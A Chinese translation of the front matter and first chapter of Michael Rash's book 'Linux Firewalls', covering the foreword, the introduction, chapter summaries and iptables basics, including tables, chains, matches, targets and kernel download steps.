# Linux 防火墙指南



![](img/httpatomoreillycomsourcenostarchimages315892.jpg)



版权 © 2009
No Starch Press

***

**LINUX FIREWALLS.** 版权 © 2007 Michael Rash。

保留所有权利。未经版权所有者和出版者的书面许可，不得以任何形式或通过任何电子或机械手段（包括复印、录制或通过任何信息存储或检索系统）复制或传输本书的任何部分。

![](img/httpatomoreillycomsourcenostarchimages207380.png) 在美国使用再生纸打印

11 10 09 08 07 1 2 3 4 5 6 7 8 9

ISBN-10: `1-59327-141-7`
ISBN-13: `978-1-59327-141-1`

| 出版商: | William Pollock |
| :--- | :--- |
| 制作编辑: | Christina Samuell |
| 封面与内设计: | Octopod Studios |
| 开发编辑: | William Pollock |
| 技术审核员: | Pablo Neira Ayuso |
| 文字编辑: | Megan Dunchak 和 Bonnie Granat |
| 排字员: | Christina Samuell 和 Riley Hoffman |
| 校对员: | Karol Jurado 和 Riley Hoffman |
| 索引员: | Nancy Guenther |

有关书籍分销商或译本的信息，请直接联系 No Starch Press, Inc.：

No Starch Press, Inc. 555 De Haro Street, Suite 250, San Francisco, CA 94107 电话：415.863.9900; 传真：415.863.9950; info@nostarch.com; [www.nostarch.com](http://www.nostarch.com)

*美国国会图书馆编图书数据*

`Rash, Michael`.
`Linux firewalls : attack detection and response with iptables, psad, and fwsnort / Michael Rash.`
`p. cm.`
`包含索引.`
`ISBN-13: 978-1-59327-141-1`
`ISBN-10: 1-59327-141-7`
`1. --访问控制. 2. 防火墙（计算机安全） 3. Linux. I. Title.`
`QA76.9.A25R36 2007`
`005.8--dc22`
`2006026679`

No Starch Press 和 No Starch Press 标志是 No Starch Press, Inc. 的注册商标。此处提到的其他产品和公司名称可能是其各自所有者的商标。我们并未在每次出现商标名称时使用商标符号，而是仅以编辑方式并为了商标所有者的利益使用，无侵犯商标的意图。

书中的信息按“现状”提供，不作任何保证。虽然在准备本书时已采取一切预防措施，但作者或 No Starch Press, Inc. 对因书中信息直接或间接引起或据称引起任何损失或损害而对任何个人或实体不承担任何责任。

# 致谢

《Linux 防火墙》的诞生得益于沿每一步中许多人的帮助。我特别感谢 No Starch Press 的人员，感谢他们付出的努力。William Pollock、Bonnie Granat、Megan Dunchak 和 Christina Samuell 都付出了许多小时的专业编辑工作，使这本书的质量更高。感谢 Pablo Neira Ayuso 帮助让 `Netfilter` 和 `iptables` 成为今天今日的模样，并负责了书中材料的技术编辑工作。Tenable Network Security 的首席技术官 Ron Gula 和 Splunk 的首席安全策略师 Raffael Marty 都提供了建设性的批评，并在本书出版前还慷慨地为本书背书。我还要想感谢 TaoSecurity 的创始人 Richard Bejtlich，他撰写了一篇出色的序言。Richard，你的书籍是我的灵感来源。我的父母 James 和 Billie Mae 以及我的兄弟 Brian 都因为他们不断的鼓励而应该得到特别感谢。最后，非常感谢我的妻子 Katie。没有你，这本书是不可能实现的。

# 前言

当听到*防火墙*一词时，大多数人会想到一种在 OSI 参考模型网络层和传输层检查网络流量并做出通过或过滤决策的产品。从产品角度来看，存在几十种防火墙类型。它们根据所检查的数据源（例如网络流量、主机进程或系统调用）以及检查这些源的深度进行区分。几乎任何检查通信并决定是否通过或过滤的设备都可以被视为防火墙产品。

代理防火墙的发明者、第一种商业防火墙产品的实施者 Marcus Ranum 在 20 世纪 90 年代对*防火墙*一词给出了定义，他说：“防火墙是你互联网安全策略的实现。”这是一个非常好的定义，因为它是产品中性的、永恒的且现实的。它同样适用于 William R. Cheswick 和 Steven M. Bellovin 编写的原始防火墙书籍《防火墙与网络安全》（Addison-Wesley Professional, 1994）。

按照 Ranum 的定义，防火墙也可以被视为一种策略执行系统。检查并通过或过滤流量的设备可以被称为*网络策略执行系统*。检查并通过或过滤主机活动的可以被称为*主机策略执行系统*。无论何种情况，强调策略执行将注意力放在防火墙的正确角色上，而不是仅仅是“阻止坏东西”的设备。

对于“坏东西”，在今天的企业中防火墙是否有效是合理的。配置良好的传统防火墙基本上拒绝所有互联网协议、IP 地址、`TCP/UDP` 端口以及 `ICMP` 类型和代码。在现代攻击环境中，这种防御完全不足。限制那些剥利用通道对于限制目标的入站和出口是必要的，但网络和传输层过滤至少十年来一直是完全不充分的措施。

2007 年，攻击客户端的最有效方法是引导用户激活恶意执行文件、向用户发送带有恶意内容的链接，或攻击用户计算体验的其他客户端组件。在许多情况下，利用并不依赖于可以修复的漏洞或可以加强的配置。相反，攻击者利用了 `JavaScript` 和 `Flash` 等富媒体平台的漏洞，这些平台对于现在的网页日益需要。

2007 年，攻击服务器的最有效方法是绕过操作系统并利用应用程序。Web 应用程序主导服务器领域，它们更容易出现架构和设计缺陷。十年代末更改购物车物品的价格来演示不安全的应用程序是一种时尚。得益于 `Ajax`，几乎十年后购物车运行在客户端，用户再次更改价格——而且情况更糟。

这一切让防火墙产品的局面看起来相当暗淡。许多产品通过整合深度数据包检测或在 OSI 参考模型的应用层或之上运行来适应。其他产品则作为*入侵防御系统*运行，使用一个聪明的营销术语在看似同质化的市场中脱颖而出。在客户端攻击和 Web 应用程序利用的时代，防火墙（特别是开源产品）是否还有地位？




答案是肯定的——而且你现在正在阅读一种方法。Michael Rash 是创造性利用网络技术进行防御目的的先驱。从一眼某特定拉斯维加斯黑客会议的演讲者名单就可以看出，安全研究和开发世界往往被攻击性工具和技术所主导。Michael 与这一趋势背道而行，他继续发明并改进保护资产免受攻击的方法。在从攻击性会议上领略了黑暗面目后，我们几乎所有人都会回到保护企业这看似看似平庸的工作。得益于这本书，我们拥有了一套额外的程序和方法来让我们的工作变得更加轻松。

在阅读这本书草稿时，我识别出了几个主题。首先，随着设备变得自给自足并暴露在互联网上，以主机为中心的防御变得越来越重要。这种演变的一个极端例子是 `IPv6` 的引入，当它按照其创始者的预期进行部署时，它恢复了原始互联网的“端到端”特性。当然，`end-to-end` 也可以翻译为“攻击者到受害者”，因此，主机保护自身的其他方法也是可赞的。`Linux Firewalls` 将教你如何使用基于主机的防火墙和工具来保护主机。

其次，尽管主机必须日益增强自卫，但仅靠主机为中心的措施是不够的。一旦主机被攻破，它就无法再负责自己的防御。入侵者突破系统后，会惯性地禁用主机防火墙、防病毒软件和其他保护代理。因此，在可能的情况下仍然需要以网络为中心的过滤设备。受害者控制的终端只能使用网络防火墙允许的通信通道，至少限制了入侵者享有的机动自由。`Linux Firewalls` 也将教你网络设备如何保护主机。

第三，我们必须寻找防御资产的创造性方法并理解攻击格局。如果想限制对敏感服务的访问，单包授权（Single Packet Authorization）是比端口敲门（port knocking）更巨大的一步。可视化有助于通过渲染日志和流量，使分析师能够检测到感兴趣的细微事件。读完这本书后，你可能会发现一些其他人（包括作者在内）未预到的利用你的防御基础设施的其他方法。

我想以书评评论员和作者的身份总结这些想法。在 2000 年到 2007 年年中期间，我阅读并评阅了近 250 本技术类书籍。我也写过几本书，所以我相信我能认出一本好书。`Linux Firewalls` 是一本好书。我是一个 FreeBSD 用户，但 `Linux Firewalls` 足够优秀，足以让我考虑在某些情况下使用 Linux！Mike 的书非常清晰、组织良好、简洁且具有可操作性。你应该能够阅读它，并通过遵循他的示例实现你发现的每一个内容。你不仅将熟悉工具并学会使用这些技术，还将欣赏作者敏锐的防御洞察力。

世界上大多数数字安全专业人员专注于防御，将攻击留给坏人、警察和军队。我欢迎像 `Linux Firewalls` 这样的书籍，它们以一种可以被消化和部署且成本和精力最低的形式，将真实的防御工具和技术带给大众。祝你好运——我们都需要它。

**Richard Bejtlich**

**通用电气事件响应总监**

**弗吉尼亚州 Manassas Park**

* * *

^([1]) ¹ *`Computer Security Journal*, 第 XI 卷，第 1 期，1995 年春季 ([`http://www.spirit.com/csi/papers/hownot.htm`](http://www.spirit.com/csi/papers/hownot.htm`))

# 引言

攻击似乎正在占据上风。几乎没有哪一天没有关于软件漏洞新利用程序的消息、更有效的垃圾邮件传播方法（我的收件箱可以证明这一点），或者从公司或政府机构发生的高知名敏感个人数据被窃取的新闻。实现安全计算是一项持久的挑战。设计用于击败狡猾黑帽的技术并不缺少，但他们仍然继续成功地攻破系统和网络。

对于每一类安全问题，几乎肯定有一个开源或专有的解决方案设计用于应对它。这在网络入侵检测系统和网络访问控制设备（防火墙、过滤路由器等）领域尤为如此。防火墙技术的一项趋势是将入侵检测世界的应用层检查技术与过滤网络流量的能力结合起来，这正是防火墙长期以来一直在做的事情。这本书的目标是证明，`Linux` 系统上的 `iptables` 防火墙定位很好，可以利用这一趋势，特别是当它与某些旨在从入侵检测角度利用 `iptables` 的额外软件结合时。

我希望这本书在现有的出版物中是独特的。那里有几本优秀的书籍讨论了 `Linux` 防火墙的各个方面，但据我所知，没有一本专门专注于可以被 `iptables` 及其提供的数据检测到（在某些情况下阻止）的攻击。还有很多关于入侵检测的书籍，但没有一本书专注于使用防火墙技术来真正补充入侵检测过程。这本书关于这两种技术的融合。

我将重点介绍三个开源软件项目，这些项目旨在最大化提高 `iptables` 在攻击检测和预防方面的效率。这些项目是：

## `psad`
一个 `iptables` 日志分析器和主动响应工具

## `fwsnort`
一个将 `Snort` 规则转换为等效 `iptables` 规则的脚本

## `fwknop`
用于 `iptables` 的单包授权 (SPA) 实现

所有这些项目都根据 GNU 公共许可证 (GPL) 作为开源软件发布，并可以 [`http://www.cipherdyne.org`](http://www.cipherdyne.org) 下载。

# 为什么要用 `iptables` 检测攻击？

> 罗森克兰茨：我的意思是，你们到底*做什么*什么？

> 玩家：我们基本上还是照常行事，只是把它们反过来做。我们在舞台上执行那些本该在后台发生的事情。这是一种诚实，如果你把每个出口看作是另一个地方的入口。

> —汤姆·斯托帕，《罗森克兰茨与吉登斯坦之死》

如果你运行 `Linux` 操作系统，你可能遇到过 `iptables` 防火墙。这很有道理，因为 `iptables` 提供了一种有效手段，可以控制谁通过网络连接与你的 `Linux` 系统通信，以及他们如何通信。在互联网这一庞大且不受控的网络中，攻击可能来自全球的任何角落——尽管入侵者在物理位置上可能位于另一个州（甚至就在隔壁房间）。如果你运行着连接了网的 `Linux` 机器，你的系统在每天 24 小时的每一秒钟里都面临着被攻击并可能被攻破的风险。



部署严格的 `iptables` 过滤策略是维护强有力安全态的良好第一步。即使你的 Linux 系统连接到上游由其他防火墙或其他过滤设备保护的网络，也始终存在该上游设备可能无法提供足够保护的可能性。此类设备可能配置不当、可能存在漏洞或其他故障，或者它可能不具备保护你的 Linux 系统免受某些类攻击的能力。在可能的情况下实现合理程度的冗余是至关重要的，而且在每个 Linux 系统（包括服务器和桌面设备）上运行 `iptables` 带来的安全收益可能会大于额外的管理开销。换句话说，系统被破解的风险以及可能丢失的数据价值，可能会大于在你的整个 Linux 基础设施中部署和维护 `iptables` 的成本。

本书的主要目标是向你展示如何从检测和响应网络攻击的角度最大化地利用 `iptables`。一个限制了“谁可以访问 Linux 系统上哪些服务”的限制 `iptables` 策略是一个良好的第一步，但你很快就会发现，你还可以做得远得多。

## 专用网络入侵检测系统如何？

检测入侵的任务通常交留给专门为此目的设计的、且对本地网络具有广泛视野的特殊系统。本书并不主张改变这一策略。作为保护网络的安全基础设施的一部分，拥有专用的网络入侵检测系统 (IDS) 是不可替代的。此外，IDS 能够收集的原始数据包数据是一个无价的数据源。每当安全分析师被要求调查攻击或系统被破解期间发生了什么时，拥有原始数据包数据对于还原整个过程至关重要，而 IDS 的事件可以指引方向。如果没有 IDS 来引起对疑活动的关注，分析师可能根本不会怀疑系统正受到攻击。

本书*确实*主倡的是使用 `iptables` 来补充现有的入侵检测基础设施。`iptables` 的主要重点是对网络流量应用策略限制，而不是检测网络攻击。然而，`iptables` 提供了强大的功能，使其能够模拟很大程度上传统属于入侵检测系统范畴的能力。例如，`iptables` 的日志格式提供了关于网络层和传输层头部中几乎每个字段的详细数据（包括 IP 和 TCP 选项），而 `iptables` 的字符串匹配能力可以对应用层数据执行字节序列匹配。这些能力对于提供检测尝试入侵的能力至关重要。

入侵检测系统通常是被动式设备，它们不会被配置为对看似恶意的网络流量自动采取任何惩罚性措施。通常情况下，这样做是有理由的，因为存在将良性流量误认为更阴险内容的风险（称为*误报*）。然而，某些 IDS 可以以在线方式部署到网络流量中，当以这种方式部署时，此类系统通常被称为网络*入侵防御系统 (IPS)*。由于 `iptables` 是一个防火墙，它对于网络流量来说始终是在线的，这使得许多攻击在造成重大损害之前就能过滤掉。许多组织由于基础连接和性能的顾虑，一直不愿在自己的网络基础设施中部署在线 IPS。然而，在某些情况下，根据应用层检查标准过滤流量的能力是非常用的，而且在 Linux 系统上，`iptables` 可以通过将 IDS 签名重转换为 `iptables` 策略来提供基本的 IPS 功能，从而阻止网络攻击。

## 深度防御

*深度防御*（Defense in depth）是一个借自军事领域的原则，通常应用于计算机安全领域。它规定在任意系统（无论是从计算机网络到物理军事设施）的各个层次都必须*预料*到攻击。没有任何能确保攻击永远不会发生。此外，某些攻击可能会成功并破坏或损害系统的某些组件。因此，在系统的各个层次采用多个层级的防御机制是至关重要的；当攻击破坏其中一个安全设备时，另一个设备可能成功限制了额外的损害。

在网络安全领域，Snort 是开源入侵检测世界的冠军，许多商业供应商也生产了出色的防火墙和其他过滤设备。然而，如果你在自己的基础设施中运行 Linux，那么真正的问题是，*仅*依赖这些安全机制来保护你的关键资产是否是明智的。深度防御原则表明，`iptables` 可以作为现有安全基础设施的重要补充。

***

¹尽管名称听起来很高大且有无尽的厂商营销炒作，但网络入侵防御系统如果没有一种*检测*攻击的方法将将一无是处——而检测机制来自 IDS 世界。

# 前提条件

本书假设你对 TCP/IP 网络概念和 Linux 系统管理有一定的了解。了解开放系统互模型 (OSI) 参考模型以及主要的网络层和传输层协议（IPv4、ICMP、TCP 和 UDP），以及一些 DNS 和 HTTP 应用协议的知识将最有帮助。尽管会频繁提到 OSI 参考模型的各个层，但网络层、传输层和应用层（分别为第 3、4 和 7 层）占据了大部分讨论。会话层和表示层未被涵盖，物理层和数据链路层仅被提及（有关第 2 层过滤的详细信息可以在 [`ebtables.sourceforge.net`](http://ebtables.sourceforge.net) 找到）。对网络层、传输层和应用层的重点在于这些每一层可能发生的攻击——很大程度上假设你已经了解这些各层的结构和功能。尽管没有专门讨论无线协议和 IPv6，但书中的许多示例也适用于这些协议。

具备基本编程概念的实用知识（特别是在 Perl 和 C 编程语言方面）也会有用，但代码示例通常会进行拆解和解释。书中的几处显示了通过 `tcpdump` 以太网嗅探器显示的原始数据包数据，因此具有 `tcpdump` 或 `Wireshark` 等以太网嗅探器的经验会有帮助。除了上述描述的内容外，不假设具备计算机安全、网络入侵检测或防火墙概念的先验知识。




最后，本本书侧重于网络攻击——如何检测并响应它们。因此，本本书通常不会讨论主机级安全问题，例如是否需要对运行 `iptables` 的系统进行加固（加固方法包括移除编译器、大幅削减用户账户、应用最新的安全补丁等）。然而，Bastille Linux 项目（访问 [`www.bastille-linux.org`](http://www.bastille-linux.org)）提供了关于主机安全问题的优秀信息。对于真正的硬核用户，NSA 的 SELinux 分发版（访问 [`www.nsa.gov/selinux`](http://www.nsa.gov/selinux)）是一项令人惊叹尝试，它从最重要的组件——内核本身开始提升了系统安全性。

# 技术参考文献

以下书籍是本书书中更具技术性的一些优秀辅助参考：

- 《Building Internet Firewalls, 2nd Edition》，Elizabeth D. Zwicky, Simon Cooper, and D. Brent Chapman (O'Reilly, 2000)
- 《Computer Networks, 4th Edition》，Andrew S. Tannenbaum (Prentice Hall PTR, 2002)
- 《Firewalls and Internet Security: Repelling the Wily Hacker, 2nd Edition》，William R. Cheswick, Steven M. Bellovin, and Aviel D. Rubin (Addison-Wesley Professional, 2003)
- 《Linux System Security, 2nd Edition》，Scott Mann and Ellen L. Mitchell (Pearson Education, 2002)
- 《Programming Perl, 3rd Edition》，Larry Wall, Tom Christiansen, and Jon Orwant (O'Reilly, 2000)
- 《The Tao of Network Security Monitoring: Beyond Intrusion Detection》，Richard Bejtlich (Addison-Wesley Professional, 2004)
- 《The TCP/IP Guide》，Charles M. Kozierok (No Starch Press, 2005)
- 《TCP/IP Illustrated, Volume 1: The Protocols》，W. Richard Stevens (Addison-Wesley, 1994)

# 关于网站

本书中包含了几个示例脚本、`iptables` 策略和命令，以及网络攻击实例和相关的数据包捕获。所有这些材料也可以从本书的配套网站下载，该地址为 [`www.cipherdyne.org/linuxfirewalls`](http://www.cipherdyne.org/linuxfirewalls)。拥有电子版是亲自琢磨和实验概念及代码的最佳方式。网站上还提供了 `psad`、`fwsnort` 和 `fwknop` 项目运行的示例，文档以及 `Trac` 接口 ([`trac.edgewall.com`](http://trac.edgewall.com))，它允许你查看每个项目的源代码。每个项目的源代码都妥善地存档在 Subversion 仓库 ([`subversion.tigris.org`](http://subversion.tigris.org)) 中，因此可以直地看到代码如何从一个版本变为另一个版本。最后，在网站上还可以找到一些 `iptables` 日志数据的有趣图形表示。

如果你在阅读本书时有任何问题，也可以在本书网站上找到答案。如果你对涵盖的任何材料有任何疑问，请随时向我提问。可以通过电子邮件 mbr@cipherdyne.org 与我联系。

# 章节摘要

在阅读*Linux Firewalls*的过程中，你将涵盖大量内容。本节提供了每个章节的简要概述，让你对内容有所预期。

### 第 1 章](#ch01.html "第 1 章：IPTABLES 的维护与管理")

本章介绍了使用 `iptables` 进行数据包过滤，包括内核构建细节和 `iptables` 管理。本章提供了一个默认策略和网络图，并在贯书中反复引用。运行默认策略的 Linux 机器作为局域网（LAN）的防火墙，针对该系统的攻击将在后续章节中进行说明。

### 第 2 章](#ch02.html "第 2 章：网络层攻击与防御")

本章展示了网络层存在的攻击类型以及你可以针对它们采取的措施。我将向你介绍 `iptables` 的日志格式，并强调你可以从 `iptables` 日志中获取的网络层信息。

### 第 3 章](#ch03.html "第 3 章：传输层攻击与防御")

传输层是通过端口扫描和探测进行服务器侦察的领域，本章检查了这些方法的内部工作原理。`iptables` 日志格式非常适合表示传输层头部信息，这对于检测各种恶意行为非常有用。

### 第 4 章](#ch04.html "第 4 章：应用层攻击与防御")

今天大多数攻击利用了运行在 TCP/IP 协议族之上日益复杂的应用程序。本章插图说明了 `iptables` 可以检测的应用层攻击类别，并向你介绍了 `iptables` 字符串匹配扩展。

### 第 5 章](#ch05.html "第 5 章：介绍 PSAD：端口攻击检测器")

本章讨论了 `psad` 的安装和配置，并向你展示了为什么倾听 `iptables` 日志的故事如此重要。

### 第 6 章](#ch06.html "第 6 章：PSAD 操作：检测可疑流量")

`psad` 提供了许多功能，这些功能旨在最大化你对 `iptables` 日志的使用。从端口扫描到后门探测，`psad` 通过详细的电子邮件和 syslog 进行报告。

### 第 7 章](#ch07.html "第 7 章：高级 PSAD 主题：从特征匹配到操作系统指纹")

本章向你介绍了高级 `psad` 功能，包括集成的操作系统指纹、通过数据头进行 Snort 特征检测、详细状态以及以及 Shield 报告。本章完全关于 `iptables` 日志信息在提供安全数据方面的深度。

### 第 8 章](#ch08.html "第 8 章：使用 PSAD 进行主动响应")

如果没有响应攻击的选择。`psad` 提供的响应能力建立在良好的接口之上，易于集成第三方软件，并包含了与 Swatch 项目的示例。

### 第 9 章](#ch09.html "第 9 章：将 Snort 规则转换为 iptables 规则")

Snort IDS 为社区了检测网络攻击的方法，因此在 `iptables` 中利用 Snort 特征语言是合理的。由于 `iptables` 提供了丰富的日志格式和检查应用层数据，许多 Snort 特征可以转换为 `iptables` 规则。

### 第 10 章](#ch10.html "第 10 章：部署 FWSNORT")

将 Snort 特征转换为 `iptables` 规则的繁琐任务已通过 `fwsnort` 项目实现，本章将向你展示实现方法。部署 `fwsnort` 为你的 `iptables` 策略赋予了真正的入侵检测能力。

### 第 11 章](#ch11.html "第 11 章：结合 PSAD 和 FWSNORT")

由 `fwsnort` 生成的日志会被 `psad` 获取并分析，以提供更好的电子邮件报告（集成 whois 和反向 DNS 查询以及被动操作系统指纹）。本章代表了通过 `iptables` 实现攻击检测和缓解策略的总结。

### 第 12 章](#ch12.html "第 12 章：端口敲与单包授权")

被动授权对于保持网络服务的安全变得越来越重要。使用这种技术可以严重限制零日漏洞的破坏范围，但并非所有被动授权范式都足够用于关键部署。本章比较并对比了两种被动授权机制：端口敲和单包授权（SPA）。

### 第 13 章](#ch13.html "第 13 章：介绍 FWKNOP")





今天现有的 SPA 实现很少，而 `fwknop` 是其中开发最活跃、支持最好的之一。本章将向你展示如何安装并结合 `iptables` 使用 `fwknop`，以维持默认拒绝策略，拦截所有未经身份验证和授权的连接你 SSH 守护进程的尝试。

## 第 14 章：可视化 iptables 日志

书的最后一章以 iptables 日志数据的某些图形表示作为结束。一张图片可以快速说明网络通信中的趋势，这些趋势可能指示着系统已被攻破；通过将 `psad` 与 AfterGlow 项目结合，你可以看到 `iptables` 显示的内容。

## 附录 A：攻击欺骗

解析 Snort 签名规则集、构造匹配的数据包并从伪造的源地址将其发送到网络是非常容易的。附录 A 讨论了一个随 `fwsnort` 的示例 Perl 脚本，它正是此类操作。

## 附录 B：完整的 FWSNORT 脚本

`fwsnort` 项目创建了一个 脚本，自动执行所需的 `iptables` 命令，以创建一个能够检测应用层攻击的 `iptables` 策略。附录 B 包含了由 `fwsnort` 生成的完整 `fwsnort.sh` 脚本示例。

本书采用了高度实用的方法。通过真实示例可以更好地理解概念，而深入源代码内部或仔细检查数据包追踪始终是理解计算机在做什么的极佳方式。我希望在读完此书后，你将掌握关于如何通过 `iptables` 检测和处理网络攻击的强大实战知识。再次，我强烈鼓励你提问，你可以随时通过 `mbr@cipherdyne.org` 与我联系。

# 第 1 章：iptables 的维护与饲养

在本章中，我们将探索在 Linux 系统上正确安装、维护和与 `iptables` 防火墙交互的本质要素。我们将从内核和用户态的双重角度涵盖 `iptables` 管理，以及如何构建和维护 `iptables` 防火墙策略。我们将构建一个默认策略，它作为书中几个章节的指南；本章还包含一个实现该策略的脚本和一个网络拓扑图供参考。书中的许多示例攻击将从该网络拓扑图所示的主机启动。最后，我们将测试默认的 `iptables` 策略，以确保其按设计运行。

## iptables

`iptables` 防火墙由 Netfilter 项目([http://www.netfilter.org]) 开发，并自 2001 年 1 月 Linux 2.4 内核发布以来一直作为 Linux 的一部分可用。

多年来，`iptables` 已成熟为一个强大的防火墙，具有大多数专有商业防火墙中常见的功能。例如，`iptables` 提供了全面的协议状态跟踪、数据包应用层检查、速率限制以及一种指定过滤策略的强大机制。所有主要的 Linux 发行版都包含 `iptables`，并且许多版本会在安装程序中直接提示用户部署 `iptables` 策略。

`iptables` 和 `Netfilter` 术语之间的差异一直是 Linux 社区困困的来源。Linux 提供的所有数据包过滤和改写设施官方项目名称为 `Netfilter`，但该术语也指 Linux 内核中的一个框架，该框架可以在网络栈的各个阶段挂钩函数。另一方面，`iptables` 使用 Netfilter 框架将设计用于执行数据包操作（如过滤）的函数挂钩到网络栈中。你可以将 Netfilter 视为为 `iptables` 构建防火墙功能提供的框架。

`iptables` 一词也指解析命令行并将防火墙策略通信给内核的用户态工具。`tables`（表）、`chains`（链）、`matches`（匹配）和 `targets`（目标，在本章后文中定义）等术语在 `iptables` 的范围内是有意义的。

Netfilter 本身并不过滤流量——它只是允许*能够*过滤流量的函数挂钩到内核中的正确位置。（我不再在此赘述这一点；书中大部分内容都围绕 `iptables` 以及它如何对符合某些标准的数据包采取行动。）Netfilter 项目还在内核中还提供了几项基础设施，例如连接跟踪和日志记录；任何 `iptables` 策略都可以使用这些设施执行专门的数据包处理。

### 注意事项

在书中，我将由 Netfilter 日志子系统生成的日志消息称为 `iptables log messages`；毕竟，数据包只有在匹配了最初由 `iptables` 构建的 `LOG` 规则时才会被记录。因此为了不引起混淆，除非有充分的理由使用 `Netfilter`（例如在讨论内核编译选项或连接跟踪能力时），否则我默认将使用 `iptables` 术语。反正大多数人都将 Linux 防火墙与 `iptables` 联系在一起。

## 使用 iptables 进行数据包过滤

`iptables` 防火墙允许用户对与 Linux 系统交互的 IP 数据包进行高度控制；该控制是在 Linux 内核内部实现的。可以使用 `iptables` 构建一个策略，充当一个强力的交通警察——未允许通过的数据包落入深渊且再无音讯，而通过检查的数据包则会被放之高行或被修改以符合本地网络的需求。

一个 `iptables` 策略由一组有序的 `rules`（规则）组成，这些规则向内核描述了针对某些类数据包应该采取的操作。每个 `iptables` 规则都应用到 `table`（表）内的一个 `chain`（链）。一个 `iptables` `chain` 是规则的集合，按顺序与共同特征的数据包（例如路由到 Linux 系统，而不是离开系统）进行比较。

### 表 (Tables)

`table` 是 `iptables` 的一种结构，用于划分功能的泛畴，例如数据包过滤或网络地址转换 (NAT)。共有四张表：`filter`、`nat`、`mangle` 和 `raw`。过滤规则应用到 `filter` 表，NAT 规则应用到 `nat` 表，修改数据包数据的特殊规则应用到 `mangle` 表，而独立于 Netfilter 连接跟踪子系统运行的规则应用到 `raw` 表。

### 链 (Chains)

每张表都有自己的内置链，但也可以创建用户定义的链，以便用户构建一组具有共同标签（如 `INPUT_ESTABLISHED` 或 `DMZ_NETWORK`）的规则。对于我们的目的而言，最重要的内置链是 `filter` 表中的 `INPUT`、`OUTPUT` 和 `FORWARD` 链：

*   `INPUT` 链由内核内核路由计算后指向本地 Linux 系统的数据包遍历（例如指向本地套接字）。
*   `OUTPUT` 链留给 Linux 系统本身生成的数据包。
*   `FORWARD` 链管理通过 Linux 系统路由的数据包（例如当 iptables 防火墙用于连接两个网络，且两个网络之间的数据包必须通过防火墙时）。





对于任何严肃的 `iptables` 部署来说，另外两个重要的链是 `nat` 表中的 `PREROUTING` 和 `POSTROUTING` 链，它们用于在内核进行 IP 路由计算之前之后修改数据包头部。本章后面的示例 `iptables` 命令将说明 `PREROUTING` 和 `POSTROUTING` 链的使用，在此期间，图 1-1 显示了数据包如何在内核的 `nat` 和 `filter` 表之间流动。

![iptables packet flow](img/httpatomoreillycomsourcenostarchimages207420.png)

图 1-1. iptables 数据包流

### 匹配 (Matches)

每个 `iptables` 规则都有一组匹配项以及一个*目标*（target），该目标告诉 `iptables` 如何处理符合规则的数据包。`iptables` `match`（匹配）是一个数据包必须满足的条件，`iptables` 才能根据规则目标指定的动作处理该数据包。例如，要将规则仅应用于 TCP 数据包，可以使用 `--protocol` 匹配项。

每个匹配项都在 `iptables` 命令行上指定。书中最重要的 `iptables` 匹配项列在下面。（当我们在第 20 页讨论贯穿本书的默认 `iptables` 策略时，你将在“默认 iptables 策略”中看到更多关于匹配项的内容。）

| `--source` (`s`) | 匹配源 IP 地址或网络 |
| `--destination` (`d`) | 匹配目标 IP 地址或网络 |
| `--protocol` (`p`) | 匹配 IP 值 |
| `--in-interface` (`i`) | 输入接口（例如，eth0） |
| `--out-interface` (`o`) | 输出接口 |
| `--state` | 匹配一组连接状态 |
| `--string` | 匹配应用层数据字节序列 |
| `--comment` | 在内核内存中与规则关联最多 256 字节的注释数据 |

### 目标 (Targets)

最后，`iptables` 支持一组目标，当数据包匹配规则时会触发相应的动作.^([3]) 书中使用的最重要的目标如下：

| `ACCEPT` | 允许数据包继续其路径。 |
| `DROP` | 丢弃数据包。不进行进一步处理，对于接收端栈而言，就像该数据包从未发送过一样。 |
| `LOG` | 将数据包记录到 syslog。 |
| `REJECT` | 丢弃数据包并同时发送相应的响应包（例如，针对 TCP 连接发送 TCP 重置包或针对 UDP 数据包发送 ICMP 端口不可达消息）。 |
| `RETURN` | 在调用链中继续处理数据包。 |

我们将在第 20 页的“默认 iptables 策略”中构建大量使用上述讨论的匹配项和目标的 `iptables` 规则。

* *

^([3]) ¹ 注意，这里的“匹配”是指数据包符合 `iptables` 规则中包含的所有匹配标准。

## 安装 iptables

由于 `iptables` 分为两个基本组件（内核模块和用户态管理程序），安装 `iptables` 涉及编译并安装 Linux 内核以及用户态二进制文件。内核源码包含了许多 Netfilter 子系统，而在从官方 Linux 内核存档网站 [`www.kernel.org`](http://www.kernel.org) 发布的原始权威内核中，默认启用了基本的数据包过滤能力。

在较早的 2.6 内核中（以及所有 2.4 内核）中，Netfilter 编译选项默认没有启用的。然而，由于 Netfilter 项目提供的软件多年来达到了很高的水平，内核维护者认为已经达到了一个点，即在 Linux 上使用 `iptables` 不再需要你重新编译内核。最近的内核允许你通过 `iptables` 策略默认过滤数据包。

虽然许多 Linux 发行版附带了已编译 `iptables` 的预构建内核，但从 [`www.kernel.org`](http://www.kernel.org) 下载的内核的默认配置尝试在开箱即用时尽可能精简，因此并不是所有的 Netfilter 子系统都已启用。例如，在 2.6.20.1 内核（截至本文时的最新内核版本）中，Netfilter 连接跟踪功能默认未启用。因此，理解重新编译内核的过程非常重要，以便 `iptables` 策略能够利用额外的功能。

### 注意

在本章中，某些编译输出和安装命令已经了简写，以节省空间并将重点放在重要内容上。

构建可以作为 `iptables` 防火墙的 Linux 系统，最重要的步骤是 Linux 内核的正确配置和编译。`iptables` 中所有密集的网络处理和比较功能都在内核中进行，我们将从从 2.6 稳定系列开始编译最新版本的内核。虽然对内核编译过程的复杂性的全面处理超出了本书的范围，但我们将讨论足够的过程，让你能够编译并启用关键功能。

### 注意

关于编译 2.6 内核的更多信息，请参阅 Kwan 编写的 [Kernel Rebuild Guide](http://www.digitalhermit.com/~kwan/kernel.html)(http://www.digitalhermit.com/~kwan/kernel.html)。对于旧的 2.4 内核，请参阅 Brian Ward 编写的 [Kernel-HOWTO](http://www.tldp.org/howto/kernel.html)(http://www.tldp.org/howto/kernel.html)，或者参考任何关于 Linux 的书籍。Brian Ward 的 *How Linux Works*No Starch Press, 2004）也涵盖了内核。

在安装 Linux 内核之前，你需要下载并解压它。以下命令用于 2.6.20.1 内核。（在这些命令中，我假设 `/usr/src` 是写。）

### 注意

除非另有说明，本章是从 2.6 系列内核的角度编写的。然而，相同的策略也适用于 2.4 系列内核。

```
 $ /usr/src
$ wget http://www.kernel.org/pub/linux/v2.6/linux-2.6.20.1.tar.bz2
$ tar xfj linux-2.6.20.1.tar.bz2
$ ls -ld linux-2.6.20.1
drwxr-xr-x  18 mbr users 600 Jun 16 20:48 linux-2.6.20.1
```

